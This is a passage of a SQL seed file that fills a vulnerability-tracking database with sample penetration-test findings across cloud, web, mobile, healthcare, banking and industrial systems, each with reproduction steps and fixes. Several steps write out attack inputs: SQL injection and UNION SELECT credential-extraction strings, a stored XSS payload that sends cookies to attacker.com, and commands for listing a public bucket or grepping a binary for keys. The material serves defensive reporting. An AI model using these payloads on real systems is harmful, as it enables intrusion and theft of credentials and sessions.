    'https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\nhttps://aws.amazon.com/blogs/security/how-to-automatically-update-your-security-groups-for-amazon-cloudfront-and-aws-waf-by-using-aws-lambda/\nhttps://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html',
    NULL),
    
    (4, 'RDS Instance', 'CLOUD-003', 'Database accessible from public internet with weak credentials', 'Database Security', 'Critical', 'Network Isolation', 'Public accessibility enabled', 9.1, 'High', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'myapp-prod-db.cluster-xyz.us-east-1.rds.amazonaws.com', 'RDS MySQL database cluster is configured with public accessibility enabled, making it directly reachable from the internet. The database uses weak credentials (admin/password123) and lacks proper network isolation. Database contains sensitive customer data including PII and payment information.',
    'Steps to reproduce:\n1. Attempt to connect to RDS endpoint from external network using MySQL client\n2. Use common username/password combinations and credential stuffing attacks\n3. Successfully authenticate using admin/password123 credentials\n4. Enumerate database structure using SHOW DATABASES and DESCRIBE commands\n5. Extract sensitive customer data from users, payments, and transactions tables\n6. Demonstrate ability to modify data and create new administrative accounts',
    'Direct internet access to the database combined with weak credentials could lead to complete data breach, including customer personal information, payment details, and business-critical data. Attackers could steal sensitive information, modify records, delete data, or use the database as a pivot point for further attacks.',
    'Moderate',
    'Immediately disable public accessibility for RDS instances and move to private subnets. Implement strong password policies with minimum 16 characters, complexity requirements, and regular rotation. Enable multi-factor authentication where possible. Use IAM database authentication and AWS Secrets Manager for credential management.',
    'https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html\nhttps://aws.amazon.com/blogs/database/managing-mysql-users-with-aws-secrets-manager/\nhttps://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.html',
    NULL),
    
    (4, 'S3 Bucket', 'CLOUD-004', 'Publicly accessible S3 bucket containing sensitive data', 'Data Storage', 'High', 'Access Controls', 'Public read access enabled', 7.7, 'Medium', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 's3://company-uploads-prod/', 'S3 bucket configured with public read access containing user uploads, application logs, database backups, and configuration files. Bucket lacks proper access controls and contains sensitive information that should not be publicly accessible.',
    'Steps to reproduce:\n1. Enumerate S3 bucket permissions using AWS CLI or web interface\n2. List bucket contents without authentication: aws s3 ls s3://company-uploads-prod/ --no-sign-request\n3. Download sensitive files including database backups and log files\n4. Extract configuration files containing API keys and database credentials\n5. Access user-uploaded documents containing personal information\n6. Demonstrate ability to access application source code backups',
    'Public S3 bucket access could expose sensitive customer data, application secrets, database backups, and proprietary information. This could lead to identity theft, account takeover, competitive intelligence gathering, and further system compromise using exposed credentials.',
    'Easy',
    'Remove public access permissions from S3 buckets immediately. Implement bucket policies and IAM roles for controlled access. Enable S3 Block Public Access settings. Use pre-signed URLs for temporary access. Implement S3 access logging and monitoring.',
    'https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html\nhttps://aws.amazon.com/blogs/aws/amazon-s3-block-public-access-another-layer-of-protection-for-your-accounts-and-buckets/',
    NULL),
    
    -- Web Application Vulnerabilities (E-commerce Platform - Test ID 1)
    (1, 'Login Form', 'WEB-001', 'SQL Injection vulnerability allowing authentication bypass', 'Input Validation', 'Critical', 'Input Sanitization', 'No prepared statements used', 9.8, 'High', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', '/api/auth/login', 'The authentication endpoint is vulnerable to SQL injection attacks due to direct concatenation of user input into SQL queries. The vulnerability allows complete authentication bypass and database enumeration. Backend uses MySQL with root privileges for application connections.',
    'Steps to reproduce:\n1. Navigate to login endpoint POST /api/auth/login\n2. Enter SQL injection payload in username field: admin'' OR ''1''=''1'' --\n3. Enter any value in password field\n4. Successfully bypass authentication and receive admin JWT token\n5. Use UNION SELECT to extract database schema: admin'' UNION SELECT 1,username,password FROM users --\n6. Extract all user credentials and sensitive data from database tables\n7. Use extracted admin credentials to access administrative functions',
    'SQL injection vulnerability allows attackers to bypass authentication, extract sensitive data including user credentials and personal information, modify database contents, and potentially gain administrative access to the entire application. This could result in complete system compromise.',
    'Easy',
    'Implement prepared statements (parameterized queries) for all database interactions. Use input validation and sanitization with whitelist approach. Implement proper error handling that doesn''t reveal database structure. Use database accounts with minimal privileges. Deploy Web Application Firewall (WAF) rules.',
    'https://owasp.org/www-community/attacks/SQL_Injection\nhttps://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\nhttps://portswigger.net/web-security/sql-injection',
    NULL),
    
    (1, 'Dashboard', 'WEB-002', 'Stored Cross-Site Scripting in user-generated content', 'Input Validation', 'High', 'Output Encoding', 'No HTML sanitization', 7.2, 'High', 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N', '/dashboard/comments', 'User-generated content in comments, profile descriptions, and message sections is stored and displayed without proper HTML encoding or sanitization. This allows for stored XSS attacks that affect all users who view the malicious content, including administrators.',
    'Steps to reproduce:\n1. Log in to user dashboard with valid credentials\n2. Navigate to profile or comments section\n3. Submit malicious JavaScript payload: <script>document.location=''http://attacker.com/steal.php?cookie=''+document.cookie</script>\n4. Content is stored in database without sanitization\n5. Any user viewing the profile/comment executes the JavaScript code\n6. Demonstrate cookie theft and session hijacking\n7. Use stored XSS to perform actions on behalf of other users including admins',
    'Stored XSS can be used to steal session cookies, redirect users to malicious sites, perform actions on behalf of users, deface the application, distribute malware, or gain administrative access when admin users view the malicious content.',
    'Easy',
    'Implement proper output encoding for all user-generated content using context-aware encoding. Use Content Security Policy (CSP) headers to prevent XSS execution. Sanitize input on both client and server side using whitelist approach. Consider using templating engines with auto-escaping.',
    'https://owasp.org/www-community/attacks/xss/\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/CSP',
    NULL),
    
    (1, 'Payment Module', 'WEB-003', 'Business logic flaw allowing price manipulation', 'Business Logic', 'Critical', 'Transaction Verification', 'Client-side price validation only', 8.7, 'High', 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N', '/api/payment/process', 'The payment processing system validates transaction amounts and product prices on the client side only, allowing users to manipulate prices before submission. The server accepts client-provided pricing information without validation against the product database.',
    'Steps to reproduce:\n1. Add expensive items to shopping cart ($1000+ products)\n2. Proceed to checkout and capture payment request using proxy tool\n3. Modify the price parameters in the request payload to $0.01\n4. Modify quantity or apply fake discount codes\n5. Submit modified payment request to server\n6. Payment processes successfully with manipulated amount\n7. Demonstrate purchase of high-value items for minimal payment',
    'Business logic flaws in payment processing could allow attackers to purchase products for significantly reduced prices or even free, potentially causing substantial financial losses. This could also be automated for large-scale fraud.',
    'Moderate',
    'Implement server-side price validation by recalculating totals based on current product prices stored in database. Use cryptographic signatures or tokens for transaction integrity. Never trust client-side calculations for financial transactions. Implement transaction monitoring and anomaly detection.',
    'https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability\nhttps://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html\nhttps://owasp.org/www-pdf-archive/OWASP_Business_Logic_Security_Cheat_Sheet.pdf',
    NULL),
    
    -- Mobile Application Vulnerabilities (Mobile Banking App - Test ID 2)
    (2, 'iOS Binary', 'MOB-001', 'Hardcoded API keys and secrets in application binary', 'Cryptographic Issues', 'High', 'Key Management', 'API keys embedded in source code', 7.5, 'Medium', 'CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'iOS Application Bundle', 'Static analysis of the iOS application binary reveals multiple hardcoded API keys, database connection strings, and third-party service credentials. These secrets are stored in plaintext within the application code and can be extracted using standard reverse engineering tools.',
    'Steps to reproduce:\n1. Extract iOS application IPA file from device or App Store\n2. Unzip IPA and locate the main executable binary\n3. Use strings command to search for API key patterns: strings [binary] | grep -E "(sk_|pk_|api_key|secret)"\n4. Identify hardcoded credentials for payment processors, analytics services, and APIs\n5. Use Hopper or IDA Pro for deeper binary analysis\n6. Extract Firebase configuration and database URLs\n7. Test extracted keys against third-party services to confirm validity',
    'Hardcoded API keys could be extracted by malicious actors and used to access third-party services, potentially leading to unauthorized charges, data access, service abuse, or account takeover. This could result in financial losses and privacy breaches.',
    'Moderate',
    'Remove all hardcoded secrets from application binaries. Use secure key management solutions like AWS Secrets Manager, Azure Key Vault, or runtime key retrieval. Implement certificate pinning and use OAuth flows instead of API keys where possible. Consider code obfuscation for additional protection.',
    'https://owasp.org/www-project-mobile-top-10/2016-risks/m10-extraneous-functionality\nhttps://developer.apple.com/documentation/security/keychain_services\nhttps://firebase.google.com/docs/projects/api-keys',
    NULL),
    
    (2, 'Android APK', 'MOB-002', 'Insecure local data storage exposing sensitive information', 'Data Storage', 'Medium', 'Encryption', 'SQLite databases unencrypted', 6.2, 'Medium', 'CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'Android Application Package', 'The Android application stores sensitive user data including authentication tokens, personal information, and financial data in unencrypted SQLite databases and shared preferences. This data is accessible to other applications on rooted devices or through ADB access.',
    'Steps to reproduce:\n1. Install application on rooted Android device or Android emulator\n2. Navigate to application data directory: /data/data/[package_name]/\n3. Extract SQLite database files from databases/ folder\n4. Open databases with SQLite browser tool\n5. Access unencrypted user credentials, session tokens, and personal data\n6. Review shared_prefs/ folder for sensitive configuration data\n7. Demonstrate data extraction without application authentication',
    'Insecure local storage could allow malicious applications or attackers with device access to extract sensitive user data, authentication tokens, and personal information. This could lead to account takeover, identity theft, and privacy violations.',
    'Easy',
    'Implement SQLCipher or Android Keystore for encrypting local databases. Use EncryptedSharedPreferences for storing sensitive configuration data. Implement runtime application self-protection (RASP) and root detection. Use Android''s BiometricPrompt for sensitive operations.',
    'https://developer.android.com/topic/security/data\nhttps://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\nhttps://www.zetetic.net/sqlcipher/sqlcipher-for-android/',
    NULL),
    
    -- Healthcare System Vulnerabilities
    (96, 'Patient Portal', 'HIPAA-001', 'Unauthorized access to patient medical records', 'Access Control', 'Critical', 'Authentication', 'Weak session management and authorization', 9.1, 'High', 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N', '/patient/records', 'The patient portal allows users to access other patients'' medical records through parameter manipulation and session hijacking. The system lacks proper authorization checks and uses predictable patient identifiers in URLs.',
    'Steps to reproduce:\n1. Log in as legitimate patient with valid credentials\n2. Navigate to medical records section\n3. Observe patient ID in URL: /patient/records?patientId=12345\n4. Modify patientId parameter to sequential values (12346, 12347, etc.)\n5. Successfully access other patients'' medical information including diagnoses, medications, and test results\n6. Demonstrate session hijacking through XSS or CSRF attacks\n7. Access administrative patient data through privilege escalation',
    'Unauthorized access to protected health information (PHI) violates HIPAA regulations and could result in significant fines (up to $1.5 million per incident), legal liability, loss of medical licenses, and severe damage to patient trust and organizational reputation.',
    'Easy',
    'Implement proper authorization checks ensuring users can only access their own medical records. Use non-predictable identifiers (UUIDs) instead of sequential IDs. Implement session management with proper timeout and regeneration. Deploy multi-factor authentication for sensitive health data access.',
    'https://www.hhs.gov/hipaa/for-professionals/security/index.html\nhttps://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\nhttps://www.hitech.com/hipaa-compliance-checklist/',
    NULL),
    
    (97, 'EHR Database', 'HIPAA-002', 'Unencrypted PHI storage violating HIPAA requirements', 'Encryption', 'Critical', 'Data Protection', 'No encryption at rest implemented', 8.9, 'High', 'CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N', 'Database Server Files', 'Protected Health Information including patient names, Social Security numbers, medical diagnoses, treatment records, and insurance information is stored in the database without encryption at rest, violating HIPAA security rule requirements.',
    'Steps to reproduce:\n1. Gain access to database server through system compromise or insider threat\n2. Navigate to database data files on disk storage\n3. Extract database files using standard database tools\n4. Open database files without requiring decryption keys\n5. Access plaintext PHI including patient records, medical history, and billing information\n6. Demonstrate data extraction from database backups\n7. Show PHI exposure in database logs and temporary files',
    'Unencrypted PHI storage creates severe HIPAA compliance violations that could result in regulatory fines up to $1.5 million per incident, criminal charges, loss of provider licenses, and mandatory breach notifications affecting thousands of patients.',
    'Moderate',
    'Implement transparent data encryption (TDE) for all databases containing PHI. Use column-level encryption for highly sensitive fields like SSNs. Establish proper encryption key management using hardware security modules (HSMs). Encrypt database backups and implement secure key rotation procedures.',
    'https://www.hhs.gov/hipaa/for-professionals/security/laws-regulations/index.html\nhttps://docs.microsoft.com/en-us/sql/relational-databases/security/encryption/transparent-data-encryption\nhttps://www.cms.gov/Research-Statistics-Data-and-Systems/CMS-Information-Technology/InformationSecurity/HIPAA-Security-Rule',
    NULL),
    
    -- Financial Services Vulnerabilities
    (126, 'Online Banking Login', 'FIN-001', 'Session fixation vulnerability in authentication system', 'Session Management', 'High', 'Authentication Controls', 'Session ID not regenerated after login', 7.3, 'High', 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N', '/banking/auth/login', 'The online banking application is vulnerable to session fixation attacks where an attacker can force a user to authenticate using a predetermined session identifier, allowing the attacker to hijack the authenticated session.',
    'Steps to reproduce:\n1. Access banking login page and note session cookie value\n2. Logout and observe that session ID remains the same\n3. Create malicious link with predetermined session ID\n4. Social engineer target user to click link and log in normally\n5. Use predetermined session ID to access victim''s authenticated banking session\n6. Demonstrate unauthorized access to account information and ability to initiate transactions\n7. Show session hijacking persists across browser restarts',
    'Session fixation attacks could allow attackers to gain unauthorized access to customer banking accounts, view sensitive financial information, transfer funds, and perform other banking operations on behalf of legitimate users, resulting in financial theft and privacy violations.',
    'Easy',
    'Regenerate session identifiers upon successful authentication and privilege level changes. Implement secure session management with appropriate timeout values, secure flags, and httpOnly attributes. Use strong session ID generation with sufficient entropy.',
    'https://owasp.org/www-community/attacks/Session_fixation\nhttps://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html\nhttps://www.ffiec.gov/press/PDF/FFIEC_Cybersecurity_Assessment_Tool.pdf',
    NULL),
    
    -- E-commerce Platform Vulnerabilities
    (171, 'Product Catalog', 'ECOM-001', 'Price manipulation through client-side parameter tampering', 'Input Validation', 'High', 'Data Integrity', 'Server-side price validation missing', 7.8, 'High', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N', '/shop/checkout', 'Product prices and discount calculations are performed client-side and can be manipulated through browser developer tools, proxy interception, or cookie modification, allowing customers to purchase items at arbitrary prices.',
    'Steps to reproduce:\n1. Add expensive items to shopping cart ($500+ products)\n2. Proceed to checkout page\n3. Open browser developer tools and inspect price elements\n4. Modify price values directly in HTML or JavaScript\n5. Alternatively, use proxy tool to intercept and modify checkout requests\n6. Change product prices to $1.00 or apply fake discount percentages\n7. Complete purchase with manipulated prices\n8. Demonstrate successful order processing at reduced cost',
    'Price manipulation vulnerabilities could result in significant financial losses as customers could systematically purchase high-value merchandise for minimal amounts. This could be automated for large-scale fraud and severely impact business revenue.',
    'Easy',
    'Implement server-side price validation by recalculating all totals based on current database prices. Use cryptographic signatures for price integrity verification. Never trust client-side calculations for financial transactions. Implement anomaly detection for unusual discount patterns.',
    'https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability\nhttps://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\nhttps://owasp.org/www-pdf-archive/OWASP_Business_Logic_Security_Cheat_Sheet.pdf',
    NULL),
    
    -- Industrial Control System Vulnerabilities
    (201, 'HMI Interface', 'ICS-001', 'Default credentials on critical industrial control systems', 'Authentication', 'Critical', 'Access Control', 'Factory default passwords unchanged', 9.8, 'Critical', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', '192.168.100.50', 'Human Machine Interface (HMI) systems controlling industrial processes are accessible via network with unchanged factory default credentials (admin/admin, operator/operator), providing complete control over critical manufacturing operations.',
    'Steps to reproduce:\n1. Scan industrial network segment for HMI web interfaces\n2. Access HMI login page at discovered IP addresses\n3. Attempt authentication with common default credentials\n4. Successfully log in using admin/admin credentials\n5. Access process control functions and safety systems\n6. Demonstrate ability to modify production parameters, safety limits, and alarm settings\n7. Show potential for causing equipment damage or safety incidents\n8. Document lack of access logging and monitoring',
    'Unauthorized access to industrial control systems could result in production shutdowns, equipment damage, product quality issues, safety incidents endangering personnel, environmental releases, and potential loss of life in critical infrastructure environments.',
    'Easy',
    'Immediately change all default passwords to strong, unique credentials. Implement multi-factor authentication for critical systems. Isolate industrial networks from corporate networks using proper segmentation. Deploy industrial security monitoring and access logging.',
    'https://www.cisa.gov/industrial-control-systems-security\nhttps://www.nist.gov/cyberframework/manufacturing\nhttps://www.sans.org/white-papers/36240/',
    NULL);

-- Sample Vulnerabilities for Testing (using existing target IDs)
INSERT INTO vulnerabilities (target_id, affected_entity, identifier, risk_statement, affected_component, residual_risk, classification, identified_controls, cvss_score, likelihood, cvssv3_code, location, vulnerabilities_description, reproduction_steps, impact, remediation_difficulty, recommendations, recommended_reading, response, solved) VALUES
    (1, 'Login Form', 'VULN-001', 'SQL injection vulnerability allows unauthorized database access', 'Authentication Module', 'High', 'High', 'Input validation', 9.8, 'High', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', '/login.php', 'SQL injection vulnerability in username parameter allows full database compromise', '1. Navigate to login page\n2. Enter '' OR 1=1 -- in username field\n3. Observe unauthorized access', 'Complete database compromise, unauthorized access to all user accounts', 'Medium', 'Implement prepared statements and parameterized queries', 'OWASP SQL Injection Prevention Cheat Sheet', 'Acknowledged - Fix scheduled for next release', false),
    
    (2, 'API Authentication', 'VULN-002', 'Weak JWT token implementation allows token forgery', 'Mobile API Gateway', 'Medium', 'Medium', 'Token validation', 7.5, 'Medium', 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', '/api/auth', 'JWT tokens use weak signing algorithm allowing forgery of authentication tokens', '1. Intercept JWT token from mobile app\n2. Modify payload and re-sign with weak algorithm\n3. Use forged token to access restricted endpoints', 'Unauthorized access to user accounts and sensitive data', 'Low', 'Upgrade to RS256 algorithm and implement proper key rotation', 'RFC 7519 - JSON Web Token Best Practices', 'In progress - Implementation started', false),
    
    (3, 'File Share Access', 'VULN-003', 'Unrestricted file access allows information disclosure', 'File Share Servers', 'Low', 'Low', 'Access controls', 4.3, 'Low', 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N', '\\\\fileserver\\shared', 'Overly permissive file share permissions allow access to sensitive documents', '1. Connect to network share\n2. Navigate to restricted directories\n3. Access confidential files without authorization', 'Disclosure of sensitive corporate documents and intellectual property', 'High', 'Review and restrict file share permissions based on principle of least privilege', 'Microsoft File Share Security Best Practices', 'Fixed - Permissions updated and audited', true),
    
    (4, 'S3 Bucket', 'VULN-004', 'Publicly accessible S3 bucket exposes sensitive data', 'S3 Bucket Storage', 'High', 'Critical', 'Bucket policies', 8.6, 'High', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 's3://company-backup-bucket', 'S3 bucket containing backup data is publicly accessible without authentication', '1. Access bucket URL directly\n2. List bucket contents\n3. Download sensitive backup files', 'Exposure of customer data, database backups, and configuration files', 'Low', 'Configure proper S3 bucket policies and enable access logging', 'AWS S3 Security Best Practices', 'Fixed - Bucket access restricted and monitoring enabled', true),
    
    (5, 'Patient Portal', 'VULN-005', 'Cross-site scripting vulnerability allows session hijacking', 'Patient Portal Interface', 'Medium', 'Medium', 'Input sanitization', 6.1, 'Medium', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', '/patient/profile', 'Stored XSS vulnerability in patient profile comments field', '1. Login to patient portal\n2. Enter malicious script in profile comments\n3. Script executes when other users view the profile', 'Session hijacking, credential theft, and unauthorized actions on behalf of users', 'Medium', 'Implement proper input validation and output encoding', 'OWASP XSS Prevention Cheat Sheet', 'Under review - Security team investigating', false);
